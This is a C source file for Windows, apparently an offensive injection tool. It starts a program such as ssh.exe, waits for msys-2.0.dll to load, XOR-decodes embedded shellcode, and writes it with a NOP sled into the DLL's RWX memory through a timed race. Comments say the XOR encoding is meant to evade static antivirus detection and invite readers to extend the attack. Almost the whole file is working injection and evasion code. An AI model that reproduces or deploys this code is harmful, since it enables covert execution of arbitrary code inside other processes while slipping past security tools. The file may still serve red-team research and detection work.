#include <windows.h>
#include <stdio.h>
#include <tchar.h>      
#include <synchapi.h>   //millisecond sleep
#include <Psapi.h>
#include "nop.h"        //holds nopsled. Default is 2048 B
#include "key.h"        //holds XOR key for shellcode to evade static analysis detection
#include "funx32.h"     //holds 32-bit shellcode 
#include "funx64.h"     //holds 64-bit shellcode
// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1

//DLL Find and Print stuff. This is not necessary for the execution, but very helpful in debugging.
// So I left it in for others to use, and hopefully expand this attack beyond just msys-2.0.dll
int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

#ifdef _DEBUG
    // Print the process identifier.
    printf("\nProcess ID: %u\n", processID);
#endif
    
    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL == hProcess)
        return 1;

    // Get a list of all the modules in this process.
    //
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                // Print the module name and handle value.
                _tprintf(TEXT("\t%s (0x%16X)\n"), szModName, hMods[i]);
            }
        }
    }
    // Release the handle to the process.
    CloseHandle(hProcess);

    return 0;
}

int FindModule(DWORD processID, TCHAR searchModName[MAX_PATH])
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    
    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL == hProcess)
        return 1;

    // Get a list of all the modules in this process.
    //
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];


            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                const char * thisModName = strrchr(szModName, '\\');
                if (strcmp(thisModName, searchModName))
                {
                    printf("[!] %s found!\n", searchModName);
                    CloseHandle(hProcess);
                    return 1;
                }
            }
        }
    }

    // Release the handle to the process.
    CloseHandle(hProcess);

    return 0;
}

//Arch detection of target process
typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64(HANDLE hProc)
{
    BOOL bIsWow64 = FALSE;

    //IsWow64Process is not available on all supported versions of Windows.
    //Use GetModuleHandle to get a handle to the DLL that contains the function
    //and GetProcAddress to get a pointer to the function if available.

    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(hProc, &bIsWow64))
        {
            //handle error
        }
    }
    return bIsWow64;
}

//Microsecond sleep, since milliseconds may not have be accurate enough to win the race condition
void uSleep(int waitTime) {
    __int64 time1 = 0, time2 = 0, freq = 0;

    QueryPerformanceCounter((LARGE_INTEGER*)&time1);
    QueryPerformanceFrequency((LARGE_INTEGER*)&freq);

    do {
        QueryPerformanceCounter((LARGE_INTEGER*)&time2);
    } while ((time2 - time1) < waitTime);
}

//MAIN:
int _tmain(int argc, TCHAR* argv[])
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;


    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (argc != 3)
    {
        printf("Usage: %s [cmdline] [addr]\n", argv[0]);
        return 1;
    }
 
    //translate cli arg of addr to proper 64-bit value
    errno = 0;
    unsigned long long n = strtoull(TEXT(argv[2]), NULL, 16);

    if (errno == EINVAL)
    {
        printf("[-] %s is not a valid number\n", argv[2]);
        return 1;
    }
    else if (errno == ERANGE)
    {
        printf("[-] %s does not fit in an unsigned long long\n", argv[2]);
        return 1;
    } 
    printf("%16llx\n", n);

    // Start the child process. 
    if (!CreateProcess(NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0 ,             // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)            // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return -1;
    }

    TCHAR ModuleName[] = "msys-2.0.dll";
    
    while(true)
    {
        if (FindModule(pi.dwProcessId, ModuleName))
        {
            break;
        }
    }

#ifdef _DEBUG
    printf("[+] Proc launched with PID of: %d\n", pi.dwProcessId);
#endif

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
        pi.dwProcessId);
    if (hProcess == nullptr) {
        printf("[x] ReadProcessMemory failed with status 0x%x\n",
            ::GetLastError());
        return -1;
    }

    //max shellcode is 1024 at the moment
    char code[1024] = {}; //final code hold
    char shc[1024] = {};
    int clen = 0;

    if (IsWow64(hProcess))
    {
#ifdef _DEBUG
        printf("[!] Using 32-bit payload\n");   
#endif
        clen = sizeof(fun32);
        memcpy(shc, fun32, clen);
    }
    else
    {
#ifdef _DEBUG
        printf("[!] Using 64-bit payload\n");
#endif
        clen = sizeof(fun64);
        memcpy(shc, fun64, clen);
    }
    
    int keylen = sizeof(keyy) / sizeof(keyy[0]);
#ifdef _DEBUG
    printf("[!] Key length detected as %d\n", keylen);
#endif

    for (int j = 0; j < clen - 1; j++)
    {
        int outputt[] = { (int)shc[j] ^ (int)keyy[j % keylen] };
        memcpy(code + j, outputt, 1);
    }
    memcpy(nopsled + 1024, code, clen);
    
    //I commented this out as when activating the process for debugging, it was breaking more often than not
/*    if (!DebugActiveProcess(pi.dwProcessId)) {
        printf("[x] DebugActiveProcess failed with status 0x%x\n",
            ::GetLastError());
        ::CloseHandle(hProcess);
        return -1;
    } */ 

    SIZE_T bytesWritten = 0;

    //Uncommenting this will add execution time, so you may miss the execution of your shellcode.
    // It is left in for debugging purposes, so you will be able to see the DLLs that are loaded by the target application
    //PrintModules(pi.dwProcessId);

    while(true)
    {
        //Uses the address of msys-2.0.dll + RWX_OFFSET
        //For example, 0x21022D120 works for 2022 x64 ssh.exe
        //To extend the capability of this application, I've allowed the user to input the addr to begin the overwrite.
        void* nX = (void*)n;
       

        if (!WriteProcessMemory(hProcess, (LPVOID)n, nopsled,
            2048, &bytesWritten)) {
            //Original code here. Commented out as due to the race condition of the DLL load and write then execute,
            // I exepct this to maybe fail once or twice before being successful
            //printf("[x] WriteProcessMemory failed with status 0x%x\n",
            //    ::GetLastError());
            //return -1;
        }
        else
        {
#ifdef _DEBUG
            printf("[+] RWX space in DLL overwritten successfully!\n");
#endif
            break;
        }
        uSleep(1000);
    }

    //Same as comment about the debug above. I have a feeling it could be a permissions thing,
    //  but luckily I didn't seem to need SeDebugPriv in my tests without the DebugActiveProcess calls
    //if (!DebugActiveProcessStop(pi.dwProcessId)) {
    //    printf("[x] DebugActiveProcessStop failed with status 0x%x\n",
    //        ::GetLastError());
    //    ::CloseHandle(hProcess);
    //    return -1;
    //}
#ifdef _DEBUG
    //I got the burgers that will... well, I got the burgers...
    printf("[!] Have some cheezburgers...\n"); //Insert your own custom win message here
#endif
    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}